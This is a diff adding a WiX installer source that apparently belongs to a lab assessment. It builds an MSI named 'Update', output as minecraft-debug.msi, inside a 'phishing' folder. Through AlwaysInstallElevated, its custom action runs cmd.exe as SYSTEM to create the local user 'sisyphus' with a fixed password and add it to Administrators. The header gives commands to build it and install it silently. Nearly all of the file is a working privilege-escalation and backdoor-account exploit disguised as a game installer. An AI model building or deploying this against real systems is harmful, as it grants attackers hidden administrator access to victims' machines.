@@ -1,0 +1,35 @@
+<?xml version="1.0"?>
+<!--
+  adduser-debug.wxs - DIAGNOSTIC build of adduser.wxs (Stage 6).
+  ISOLATED LAB ONLY. Authorised TAFE Cert IV assessment.
+
+  Same type-50 custom action, but redirects net.exe output + whoami to
+  C:\Users\Public\pwn.txt so we can see the real error and the run context.
+    - whoami prints "nt authority\system"  -> elevation worked (AlwaysInstallElevated OK)
+    - whoami prints "olympus\persephone"    -> NOT elevated -> HKCU key missing for this user
+    - "System error 5"  -> access denied (not elevated)
+    - "System error 2245" -> password policy
+
+  BUILD:  wixl -o /home/gcit/tools/minecraft-debug.msi phishing/adduser-debug.wxs
+  RUN (as persephone, local disk):
+      msiexec /quiet /qn /i C:\Users\persephone\Downloads\minecraft-debug.msi
+      type C:\Users\Public\pwn.txt
+-->
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="Update" Language="1033" Version="1.0.0.0"
+           Manufacturer="x" UpgradeCode="12345678-1234-1234-1234-1234567890AB">
+    <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine"/>
+    <Directory Id="TARGETDIR" Name="SourceDir"/>
+    <Feature Id="F" Level="1"/>
+
+    <Property Id="CMDEXE" Value="C:\Windows\System32\cmd.exe"/>
+
+    <CustomAction Id="Pwn" Execute="deferred" Impersonate="no" Return="ignore"
+      Property="CMDEXE"
+      ExeCommand='/c whoami &gt; C:\Users\Public\pwn.txt 2&gt;&amp;1 &amp; net user sisyphus P3rseph0ne!26 /add &gt;&gt; C:\Users\Public\pwn.txt 2&gt;&amp;1 &amp; net localgroup administrators sisyphus /add &gt;&gt; C:\Users\Public\pwn.txt 2&gt;&amp;1'/>
+
+    <InstallExecuteSequence>
+      <Custom Action="Pwn" After="InstallInitialize"/>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
